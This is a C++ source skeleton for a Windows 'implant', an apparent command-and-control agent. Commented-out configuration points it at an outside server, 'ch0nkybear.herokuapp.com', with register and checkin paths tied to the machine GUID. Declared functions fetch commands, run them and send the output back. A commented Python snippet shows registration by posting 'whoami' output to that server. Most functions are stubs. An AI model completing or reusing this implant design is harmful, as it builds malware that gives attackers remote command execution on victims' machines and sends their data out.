#include <winsock2.h>
#include <windows.h>
#include <stdio.h>
#include <iostream>
#include <winreg.h>
#include <WinBase.h>
#include <lmcons.h>
#include <securitybaseapi.h>
#include <winerror.h>
#include <iphlpapi.h>
#include <iptypes.h>
#include <processthreadsapi.h>


#include <ws2tcpip.h>

#include <fileapi.h> 

//For hex converter
#include <stdexcept>
#include <sstream>
#include <iomanip>
#include <string>
#include <cstdint>
//For hex converter

//For http request
#include <windows.h>
#include <string>
#include <iostream>
#include <winhttp.h>
//For http request

#include "info.h"
#include "http.h"


/*

std::wstring server = L"ch0nkybear.herokuapp.com"; 
std::wstring register_path = L"/register";
std::wstring checkin_path = wcscat( L"/checkin/", GetMachineGuid()); //concat with implant_id
int port = 443;
bool useTLS = 1;
*/
//Make request


//std::wstring makeHttpRequest(std::wstring fqdn, int port, std::wstring uri, bool useTLS, std::wstring payload, DWORD payloadLength);


//Convert from string to hex ISSUES
//https://stackoverflow.com/questions/3381614/c-convert-string-to-hexadecimal-and-vice-versa
/*
std::wstring string_to_hex(const std::wstring &in) {
    std::wstringstream ss;

    ss << std::hex << std::setfill('0');
    for (size_t i = 0; in.length() > i; ++i) {
        ss << std::setw(2) << static_cast<unsigned int>(static_cast<unsigned char>(in[i]));
    }

    return ss.str(); 
}
*/


//get cmd
wchar_t *getCMD();

//Run cmd
wchar_t *runCMD(wchar_t*CMD);



//sendResponse(data from runtasks)
void sendData(wchar_t*output);

/*EXAMPLE OF PYTHON REGISTER Function

implant_id = os.urandom(10).hex()
    whoami = subprocess.Popen("whoami", stdout=subprocess.PIPE)
    output += result.stdout.read().decode()
    r = requests.post(f"{server}{reigster_path}", json={"implant_id":implant_id, "whoami":whoami})
    if r.status_code ==200:
        if r.text == "OK":
            print("reigstered!")
            return True 
        
    return False 
	*/


//register function
bool registerImplant();

